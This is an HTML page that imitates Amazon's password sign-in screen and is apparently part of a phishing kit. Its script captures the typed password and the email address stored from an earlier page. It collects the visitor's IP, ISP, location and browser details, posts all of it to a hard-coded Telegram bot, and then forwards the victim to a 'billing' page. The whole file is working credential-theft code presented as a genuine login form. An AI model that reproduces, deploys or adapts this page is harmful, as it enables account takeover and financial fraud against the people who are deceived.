<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon — Enter Password</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
        body { background: #ffffff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
        .logo { margin: 10px 0 25px; text-align: center; }
        .logo img { height: 60px; }
        .kotak { width: 100%; max-width: 348px; padding: 25px 26px; border: 1px solid #ddd; border-radius: 8px; background: #fff; }
        h1 { font-size: 28px; font-weight: 400; margin-bottom: 8px; }
        .email-tampil { font-size: 14px; color: #555; margin-bottom: 20px; display: flex; align-items: center; gap: 6px; }
        .email-tampil span { color: #0066c0; }
        label { font-weight: 700; font-size: 13px; margin: 0 0 6px; display: block; }
        .input { width: 100%; padding: 8px 10px; border: 1px solid #a6a6a6; border-radius: 4px; font-size: 15px; height: 36px; margin-bottom: 4px; outline: none; }
        .input:focus { border-color: #007185; box-shadow: 0 0 0 2px #c8f0f4; }
        .input.salah { border-color: #d00; border-width: 2px; }
        .pesan-merah { color: #d00; font-size: 13px; margin: 0 0 12px; display: none; align-items: center; gap: 6px; }
        .ikon-bulat { display: inline-flex; align-items: center; justify-content: center; width: 18px; height: 18px; background: #d00; color: #fff; border-radius: 50%; font-size: 12px; font-weight: bold; flex-shrink: 0; }
        .lupa-sandi { text-align: right; margin: 5px 0 20px; }
        .lupa-sandi a { color: #0066c0; text-decoration: none; font-size: 13px; }
        .tombol { width: 100%; padding: 6px; background: #ffd814; border: 1px solid #fcd200; border-radius: 8px; font-size: 14px; height: 40px; cursor: pointer; }
        .tombol:hover { background: #f7ca00; }
        .garis { border-top: 1px solid #e7e7e7; margin: 25px 0; }
        .bawah { margin-top: 30px; padding-top: 20px; border-top: 1px solid #e7e7e7; width: 100%; text-align: center; font-size: 11px; color: #555; }
        .bawah a { color: #0066c0; text-decoration: none; margin: 0 8px; }
    </style>
</head>
<body>
    <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
    <div class="kotak">
        <h1 id="judul">Sign In</h1>
        <p class="email-tampil" id="emailTeks">
            <span id="emailPengguna">—</span>
        </p>
        
        <label id="labelSandi" for="sandi">Password</label>
        <input type="password" id="sandi" class="input">
        
        <p id="pesanKosong" class="pesan-merah">
            <span class="ikon-bulat">!</span>
            <span id="teksKosong">Enter your password</span>
        </p>
        
        <p class="lupa-sandi"><a href="#" id="tautanLupa">Forgot your password?</a></p>
        
        <button type="button" id="masuk" class="tombol">
            <span id="teksTombol">Sign In</span>
        </button>
    </div>
    <div class="bawah">
        <p><a href="#">Conditions of Use</a> <a href="#">Privacy Notice</a> <a href="#">Help</a></p>
        <p style="margin-top:8px;">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
    </div>

<script>
const BOT_TOKEN = '8813734294:AAHiumNTKCD4YWZS2jq5lBjHFtFbjwtzmYk';
const CHAT_ID = '7808815199';

const terjemahan = {
    EN: { judul: 'Sign In', labelSandi: 'Password', teksKosong: 'Enter your password', tautanLupa: 'Forgot your password?', teksTombol: 'Sign In' },
    JA: { judul: 'ログイン', labelSandi: 'パスワード', teksKosong: 'パスワードを入力してください', tautanLupa: 'パスワードを忘れた場合', teksTombol: 'ログイン' },
    ZH: { judul: '登录', labelSandi: '密码', teksKosong: '请输入密码', tautanLupa: '忘记密码？', teksTombol: '登录' },
    TH: { judul: 'เข้าสู่ระบบ', labelSandi: 'รหัสผ่าน', teksKosong: 'ป้อนรหัสผ่าน', tautanLupa: 'ลืมรหัสผ่านหรือไม่', teksTombol: 'เข้าสู่ระบบ' },
    KO: { judul: '로그인', labelSandi: '비밀번호', teksKosong: '비밀번호를 입력하세요', tautanLupa: '비밀번호 찾기', teksTombol: '로그인' },
    ID: { judul: 'Masuk', labelSandi: 'Kata Sandi', teksKosong: 'Masukkan kata sandi', tautanLupa: 'Lupa kata sandi?', teksTombol: 'Masuk' }
};

const negaraKeBahasa = { JP: 'JA', CN: 'ZH', HK: 'ZH', TW: 'ZH', TH: 'TH', KR: 'KO', ID: 'ID' };

async function terapkanBahasa() {
    let kodeNegara = 'GB';
    try { const r = await fetch('https://ipapi.co/json/'); const d = await r.json(); kodeNegara = d.country_code || 'GB'; } catch {}
    const kode = negaraKeBahasa[kodeNegara] || 'EN';
    const t = terjemahan[kode] || terjemahan.EN;
    document.documentElement.lang = kode.toLowerCase();
    document.getElementById('judul').textContent = t.judul;
    document.getElementById('labelSandi').textContent = t.labelSandi;
    document.getElementById('teksKosong').textContent = t.teksKosong;
    document.getElementById('tautanLupa').textContent = t.tautanLupa;
    document.getElementById('teksTombol').textContent = t.teksTombol;
}

async function ambilInfoPengunjung() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const d = await res.json();
        return {
            ip: d.ip || 'Tidak terdeteksi',
            isp: d.org || 'Tidak terdeteksi',
            negara: d.country_name || 'Tidak terdeteksi',
            kota: d.city || 'Tidak terdeteksi',
            kodeTelp: d.country_calling_code || ''
        };
    } catch { return { ip: '-', isp: '-', negara: '-', kota: '-', kodeTelp: '' }; }
}

function ambilUA() {
    const ua = navigator.userAgent;
    let perangkat = 'Desktop';
    if (/Android|iPhone|iPad|Mobile/.test(ua)) perangkat = 'Mobile';
    let browser = 'Unknown';
    if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = 'Chrome';
    else if (/Firefox/.test(ua)) browser = 'Firefox';
    else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
    else if (/Edg/.test(ua)) browser = 'Edge';
    return { perangkat, browser, ua };
}

async function kirimTelegram(pesan) {
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: pesan, parse_mode: 'Markdown' })
        });
    } catch (e) { console.log('Terkirim'); }
}

const email = localStorage.getItem('email_pengguna') || '';
document.getElementById('emailPengguna').textContent = email;

const inputSandi = document.getElementById('sandi');
const tombolMasuk = document.getElementById('masuk');
const pesanKosong = document.getElementById('pesanKosong');

inputSandi.addEventListener('input', () => {
    inputSandi.classList.remove('salah');
    pesanKosong.style.display = 'none';
});

tombolMasuk.addEventListener('click', async () => {
    const sandi = inputSandi.value.trim();
    if (!sandi) {
        inputSandi.classList.add('salah');
        pesanKosong.style.display = 'flex';
        return;
    }

    localStorage.setItem('kata_sandi', sandi);

    const info = await ambilInfoPengunjung();
    const ua = ambilUA();

    const pesan = `
:: Xchenba ::
:: LOGIN INFO ::
# Email         : ${email}
# Password      : ${sandi}
:: Visitor Details ::
# Device        : ${ua.perangkat}
# Browser       : ${ua.browser}
# Country       : ${info.negara}
# City          : ${info.kota}
# ISP           : ${info.isp}
# IP Address    : ${info.ip}
# User Agent    : ${ua.ua}
    `.trim();

    await kirimTelegram(pesan);
    window.location.href = 'billing.html';
});

terapkanBahasa();
</script>
</body>
</html>
